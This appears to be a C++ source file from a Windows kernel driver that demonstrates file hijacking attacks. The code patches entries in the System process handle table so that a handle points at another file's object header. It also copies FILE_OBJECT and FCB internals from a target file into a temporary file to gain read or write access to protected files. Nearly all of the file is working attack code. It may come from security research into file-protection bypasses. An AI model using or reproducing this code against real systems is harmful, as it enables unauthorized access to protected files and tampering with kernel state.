

#include "files_hijacking.h"

FILE_OBJECT fo_backup_copy = { 0 };

PFILE_OBJECT g_Fileobj_secret = NULL;

PFILE_OBJECT g_Fileobj_hijacker = NULL;

extern "C" namespace files_hijacking {

    //////////////////////////////////////////////////////////////////////////

    bool HijAttOpenFile(zwfile::FileWriter & fw_open_file, PVOID in_buf, ULONG in_buf_sz, PVOID out_buf, ULONG out_buf_sz) {
        UNREFERENCED_PARAMETER(in_buf);
        UNREFERENCED_PARAMETER(in_buf_sz);
        UNREFERENCED_PARAMETER(out_buf);
        UNREFERENCED_PARAMETER(out_buf_sz);
        zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf);
        return true;
    }

    bool HijAttReadFile(zwfile::FileWriter & fw_open_file, PVOID in_buf, ULONG in_buf_sz, PVOID out_buf, ULONG out_buf_sz) {
        UNREFERENCED_PARAMETER(in_buf);
        UNREFERENCED_PARAMETER(in_buf_sz);
        UNREFERENCED_PARAMETER(out_buf);
        UNREFERENCED_PARAMETER(out_buf_sz);
        if (g_Fileobj_secret && g_Fileobj_hijacker) {
            hijacking_fileobj_internals(g_Fileobj_secret, g_Fileobj_hijacker);
        }        
        zwfile::zw_read_file(fw_open_file, in_buf_sz, in_buf);
        return true;
    }

    bool HijAttWriteFile(zwfile::FileWriter & fw_open_file, PVOID in_buf, ULONG in_buf_sz, PVOID out_buf, ULONG out_buf_sz) {
        UNREFERENCED_PARAMETER(in_buf);
        UNREFERENCED_PARAMETER(in_buf_sz);
        UNREFERENCED_PARAMETER(out_buf);
        UNREFERENCED_PARAMETER(out_buf_sz);
        zwfile::zw_write_file(fw_open_file, in_buf_sz, in_buf);
        return true;
    }

    bool HijAttCloseFile(zwfile::FileWriter & fw_open_file) {
        if (fo_backup_copy.Vpb ||
            fo_backup_copy.FsContext ||
            fo_backup_copy.FsContext2 ||
            fo_backup_copy.SectionObjectPointer) {
            // Restore fields in temporary FILE_OBJECT after hijacking
            FILE_OBJECT * a_file_obj = (FILE_OBJECT *)fw_open_file.get_object();
            copy_fileobj_fields(&fo_backup_copy, a_file_obj);
        }
        // Close the temporary file
        fw_open_file.close();
        return true;
    }

    //////////////////////////////////////////////////////////////////////////




    //////////////////////////////////////////////////////////////////////////

    const int g_ObjectPointerBitsOffset = (OBJECTPOINTERBITS_OFFSET);
    const int  g_ObjectPointerBitsSz = (OBJECTPOINTERBITS_SIZE);
    //char g_ObjectPointerBits[g_ObjectPointerBitsSz] = { 0 };

#define EX_ADDITIONAL_INFO_SIGNATURE (ULONG_PTR)(-2)

#define ExpIsValidObjectEntry(Entry) \
    ( (Entry != NULL) && (Entry->LowValue != 0) && (Entry->HighValue != EX_ADDITIONAL_INFO_SIGNATURE) )

    /*
    1.247 InterlockedExchangeAdd
    The InterlockExchangeAdd function performs an atomic addition of an increment value to an addend variable. The
    function prevents more than one thread from using the same variable simultaneously.

    Remarks
    The functions InterlockedExchangeAdd, InterlockedCompareExchange, InterlockedDecrement,
    InterlockedExchange, and InterlockedIncrement provide a simple mechanism for synchronizing access to a
    variable that is shared by multiple threads. The threads of different processes can use this mechanism if the variable is
    in shared memory.
    The InterlockedExchangeAdd function performs an atomic addition of the Increment value to the value pointed to
    by Addend. The result is stored in the address specified by Addend. The initial value of the variable pointed to by
    Addend is returned as the function value.
    The variables for InterlockedExchangeAdd must be aligned on a 32-bit boundary; otherwise, this function will fail
    on multiprocessor x86 systems and any non-x86 systems.
    */

    /* Implement _InterlockedExchangeAdd8 in terms of _InterlockedCompareExchange8 */
    // static __inline char
    // _InterlockedExchangeAdd8(char volatile *Addend, char Value)
    // {
    // 	char Initial = *Addend;
    // 	char Comparand;
    // 	do {
    // 		char Exchange = Initial + Value;
    // 		Comparand = Initial;
    // 		Initial = _InterlockedCompareExchange8(Addend, Exchange, Comparand);
    // 	} while (Initial != Comparand);
    // 	return Comparand;
    // }
    //
    // lock inc byte ptr [rax] ds:002b:ffff8a80`09c67c20=fe
    //

    VOID ExUnlockHandleTableEntry(
            __inout PHANDLE_TABLE HandleTable,
            __inout PHANDLE_TABLE_ENTRY HandleTableEntry) {
        // Release implicit locks, the function ExUnlockHandleTableEntry() - is unresolved 
        _InterlockedExchangeAdd8((char*)&HandleTableEntry->VolatileLowValue, 1);  // Set Unlocked flag to 1
        if (HandleTable != NULL && HandleTable->HandleContentionEvent)
            ExfUnblockPushLock(&HandleTable->HandleContentionEvent, NULL);
    }

    typedef struct _HandleTableHijacker {
        HANDLE hijackerHandle;
        void * targetFileObjectHeader;
    }HandleTableHijacker, *PHandleTableHijacker;

    /// <summary>
    /// Handle enumeration callback
    /// </summary>
    /// <param name="HandleTable">Process handle table</param>
    /// <param name="HandleTableEntry">Handle entry</param>
    /// <param name="Handle">Handle value</param>
    /// <param name="EnumParameter">User context</param>
    /// <returns>TRUE when desired handle is found</returns>
    BOOLEAN walkthrough_handle_table_and_patch(
        IN PHANDLE_TABLE HandleTable,
        IN PHANDLE_TABLE_ENTRY HandleTableEntry,
        IN HANDLE Handle,
        IN PVOID EnumParameter ) {

        UNREFERENCED_PARAMETER(HandleTable);
        BOOLEAN result = FALSE;
        if (HandleTableEntry) {
            if (EnumParameter != NULL) {
                PHandleTableHijacker hijacker_param = (PHandleTableHijacker)EnumParameter;
                if (Handle == hijacker_param->hijackerHandle) {
                    if (ExpIsValidObjectEntry(HandleTableEntry)) {
                        DbgPrint("The hijacker handle table entry is found.\r\n");
                        DbgPrint("Checking handle table entry..\r\n");

                        char *addr = ((char*)HandleTableEntry + g_ObjectPointerBitsOffset);
                        int zeros = 0;
                        // check hijacked handle table entry 
                        for (int i = 0; i < g_ObjectPointerBitsSz; i++) {
                            if (addr[i] == 0) {
                                zeros++;
                            }
                        }
                        if (zeros != g_ObjectPointerBitsSz) {
                            // change the hijacked handle table entry to the target object header
                            DbgPrint("Patching handle table entry..\r\n");
                            for (int i = 0; i < g_ObjectPointerBitsSz; i++) {
                                addr[i] = ((char*)&hijacker_param->targetFileObjectHeader)[i];
                            }
                            result = TRUE;
                        }
                    }

                }
            }
        }

        //ExUnlockHandleTableEntry(HandleTable, HandleTableEntry);

        // Release implicit locks
        _InterlockedExchangeAdd8((char*)&HandleTableEntry->VolatileLowValue, 1);  // Set Unlocked flag to 1
        if (HandleTable != NULL && HandleTable->HandleContentionEvent)
            ExfUnblockPushLock(&HandleTable->HandleContentionEvent, NULL);
        return result;
    }

    bool DriverAttackerpGetObjectHeaderByHandle(HANDLE targetFileHandle, void* & targetObjectHeader) {
        PFILE_OBJECT targetFileObject = NULL;
        NTSTATUS nt_status = ObReferenceObjectByHandle(targetFileHandle, FILE_ALL_ACCESS,
            *IoFileObjectType, KernelMode, (PVOID *)&targetFileObject, NULL);
        if (NT_SUCCESS(nt_status)) {
            targetObjectHeader = (void*)((char*)targetFileObject - 0x30);
            DbgPrint("The target OBJECT_HEADER is here [%I64X].\r\n", targetObjectHeader);
            if (targetFileObject) { ObDereferenceObject(targetFileObject); }
        }
        return NT_SUCCESS(nt_status);
    }

    bool DriverAttackerpHijackHandleTable(HANDLE hijackerHandle, void* targetObjectHeader) {
        bool b_res = false;
        const HANDLE system_pid = (HANDLE)4;
        PEPROCESS system_eprocess = NULL;
        if (NT_SUCCESS(PsLookupProcessByProcessId(system_pid, &system_eprocess))) {
            DbgPrint("Looking for the handle table entry..\r\n");

            PHANDLE_TABLE pTable = *(PHANDLE_TABLE*)((char*)system_eprocess + g_EprocOffsets.ObjectTable /*dynData.ObjTable*/);
            HandleTableHijacker table_hijacker = { 0 };
            table_hijacker.hijackerHandle = (ObKernelHandleToHandle(hijackerHandle)); //hijackerHandle = ObMarkHandleAsKernelHandle(hijackerHandle);
            table_hijacker.targetFileObjectHeader = targetObjectHeader;
            if (TRUE == ExEnumHandleTable(pTable, &walkthrough_handle_table_and_patch, &table_hijacker, NULL)) {
                b_res = true;
                DbgPrint("+ hijacking success! \r\n");
            }
            else { DbgPrint("- hijacking failed! \r\n"); }

            if (system_eprocess) { ObDereferenceObject(system_eprocess); }
        }
        return b_res;
    }

    bool HijAttOpenFileByHijackkingFileHandle(zwfile::FileWriter & fw_open_file, PVOID in_buf, ULONG in_buf_sz, PVOID out_buf, ULONG out_buf_sz) {
        UNREFERENCED_PARAMETER(in_buf);
        UNREFERENCED_PARAMETER(in_buf_sz);
        UNREFERENCED_PARAMETER(out_buf);
        UNREFERENCED_PARAMETER(out_buf_sz);

        bool b_res = false;
        if (in_buf_sz == sizeof HIJACKING_HANDLE_TABLE) {
            // 1. Create and open a tmp-file
           PHIJACKING_HANDLE_TABLE file = (PHIJACKING_HANDLE_TABLE)in_buf;
            if (zwfile::zw_open_file(fw_open_file, sizeof file->file_hijacker, &file->file_hijacker)) {
                void* target_file_object_header = NULL;
                if (DriverAttackerpGetObjectHeaderByHandle(file->target_file_handle, target_file_object_header) &&
                    DriverAttackerpHijackHandleTable(file->file_hijacker.handle, target_file_object_header)) {
                    file->file_hijacker.is_hijacking_ok = true;
                    b_res = true;
                }
            }
        }
        return b_res;
    }

    //////////////////////////////////////////////////////////////////////////

    bool copy_fileobj_fields(FILE_OBJECT * src, FILE_OBJECT * dst) {
        bool b_res = false;
        if (src && dst) {
            __try {
                if (src->Vpb && src->FsContext && src->FsContext2 && src->SectionObjectPointer) {
                    dst->Vpb = src->Vpb;
                    dst->FsContext = src->FsContext;
                    dst->FsContext2 = src->FsContext2;
                    dst->SectionObjectPointer = src->SectionObjectPointer;
                    b_res = true;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) { b_res = false; }
        }
        return b_res;
    }

    bool HijAttOpenFileByHijackkingFileObj(zwfile::FileWriter & fw_open_file, PVOID in_buf, ULONG in_buf_sz, PVOID out_buf, ULONG out_buf_sz) {
        UNREFERENCED_PARAMETER(in_buf);
        UNREFERENCED_PARAMETER(in_buf_sz);
        UNREFERENCED_PARAMETER(out_buf);
        UNREFERENCED_PARAMETER(out_buf_sz);

        bool b_res = false;
        if (in_buf_sz == sizeof OPEN_THE_FILE) {
            // 1. Create and open a temp file hijacker
            zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf);

            OPEN_THE_FILE *file = (OPEN_THE_FILE*)in_buf;
            if (file && NT_SUCCESS(file->status)) {
                //2. Backup fields of temporary FILE_OBJECT 
                FILE_OBJECT * hijacker_fileobj = (FILE_OBJECT *)fw_open_file.get_object();
                RtlSecureZeroMemory(&fo_backup_copy, sizeof FILE_OBJECT);

                copy_fileobj_fields(hijacker_fileobj, &fo_backup_copy);

                //3. Copy fields from target FILE_OBJECT to the temporary FILE_OBJECT
                //   to hijack the target file
                FILE_OBJECT * target_obj = (FILE_OBJECT *)file->target_object;
                file->is_hijacking_ok = copy_fileobj_fields(target_obj, hijacker_fileobj);

                file->handle = fw_open_file.get_handle();
                file->object = fw_open_file.get_object();
                b_res = true;
            }
        }
        return b_res;
    }



    //////////////////////////////////////////////////////////////////////////

    bool copy_fileobj_fcb_fscontext(FILE_OBJECT * src, FILE_OBJECT * dst) {
        bool b_res = false;
        if (src && dst && src->FsContext && dst->FsContext) {
             
            FSRTL_ADVANCED_FCB_HEADER* src_fcb = (FSRTL_ADVANCED_FCB_HEADER*)src->FsContext;
            FSRTL_ADVANCED_FCB_HEADER* dst_fcb = (FSRTL_ADVANCED_FCB_HEADER*)dst->FsContext;
            __try {

                char* dst_addr = (char*)dst_fcb;
                char* src_addr = (char*)src_fcb;
                //RtlCopyBytes(dst_addr, src_addr, 0x240 /*0x3d0*/);

                RtlCopyBytes(dst_addr, src_addr, 0x3d0);

                dst_fcb->Resource = src_fcb->Resource;
                dst_fcb->Resource->OwnerEntry.OwnerThread = (ERESOURCE_THREAD)PsGetCurrentThread();                

                dst_fcb->PagingIoResource = src_fcb->PagingIoResource;
                dst_fcb->PagingIoResource->OwnerEntry.OwnerThread = (ERESOURCE_THREAD)PsGetCurrentThread();
                
                dst_fcb->AllocationSize.QuadPart = src_fcb->AllocationSize.QuadPart;
                dst_fcb->FileSize.QuadPart = src_fcb->FileSize.QuadPart;
                dst_fcb->ValidDataLength.QuadPart = src_fcb->ValidDataLength.QuadPart;
                
                dst_fcb->FastMutex = src_fcb->FastMutex;
                PFSRTL_PER_STREAM_CONTEXT FilterContexts_src = (PFSRTL_PER_STREAM_CONTEXT)src_fcb->FilterContexts.Blink;
                PFSRTL_PER_STREAM_CONTEXT FilterContexts_dst = (PFSRTL_PER_STREAM_CONTEXT)dst_fcb->FilterContexts.Blink;
                FilterContexts_dst->OwnerId = FilterContexts_src->OwnerId;
                dst_fcb->FilterContexts.Blink = src_fcb->FilterContexts.Blink;
                dst_fcb->FilterContexts.Flink = src_fcb->FilterContexts.Flink;

                dst_fcb->PushLock = src_fcb->PushLock;
                dst_fcb->FileContextSupportPointer = src_fcb->FileContextSupportPointer;

                b_res = true;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) { b_res = false; }
        }
        return b_res;
    }

    bool copy_fileobj_ccb_fscontext2(FILE_OBJECT * src, FILE_OBJECT * dst) {
        bool b_res = false;
        if (src && dst && src->FsContext && dst->FsContext) {
            FSRTL_COMMON_FCB_HEADER* src_ccb = (FSRTL_COMMON_FCB_HEADER*)src->FsContext2;
            FSRTL_COMMON_FCB_HEADER* dst_ccb = (FSRTL_COMMON_FCB_HEADER*)dst->FsContext2;
            __try {
                dst_ccb->Resource = src_ccb->Resource;
                dst_ccb->PagingIoResource = src_ccb->PagingIoResource;
                dst_ccb->AllocationSize = src_ccb->AllocationSize;
                dst_ccb->FileSize = src_ccb->FileSize;
                dst_ccb->ValidDataLength = src_ccb->ValidDataLength;
                b_res = true;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) { b_res = false; }
        }
        return b_res;
    }

    bool hijacking_fileobj_internals(FILE_OBJECT * src, FILE_OBJECT * dst) {
        copy_fileobj_fcb_fscontext(src, dst);
        //src->Vpb = dst->Vpb;
        //src->FsContext2 = dst->FsContext2;  //  copy_fileobj_ccb_fscontext2(target_obj, hijacker_fileobj);
        src->SectionObjectPointer = dst->SectionObjectPointer;  //  copy_fileobj_section_object_pointer(target_obj, hijacker_fileobj);
        return true;
    }

    bool HijAttOpenFileByHijackingFileObjInternals(zwfile::FileWriter & fw_open_file, PVOID in_buf, ULONG in_buf_sz, PVOID out_buf, ULONG out_buf_sz) {
        UNREFERENCED_PARAMETER(in_buf);
        UNREFERENCED_PARAMETER(in_buf_sz);
        UNREFERENCED_PARAMETER(out_buf);
        UNREFERENCED_PARAMETER(out_buf_sz);

        zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf);
        if (in_buf_sz == sizeof OPEN_THE_FILE) {
            OPEN_THE_FILE *file = (OPEN_THE_FILE*)in_buf;
            if (file && NT_SUCCESS(file->status)) {
                //2. Backup fields of temporary FILE_OBJECT 
                FILE_OBJECT * hijacker_fileobj = (FILE_OBJECT *)fw_open_file.get_object();
                //copy_fileobj_vpb(hijacker_fileobj, &fo_backup_copy);

                //3. Copy fields from target FILE_OBJECT to the temporary FILE_OBJECT
                //   to hijack the target file
                FILE_OBJECT * target_obj = (FILE_OBJECT *)file->target_object;
                file->is_hijacking_ok = 1;

                g_Fileobj_secret = target_obj;
                g_Fileobj_hijacker = hijacker_fileobj;

                hijacking_fileobj_internals(g_Fileobj_secret, g_Fileobj_hijacker);
                
                file->handle = fw_open_file.get_handle();
                file->object = fw_open_file.get_object();
            }
        }
        return true;
    }


}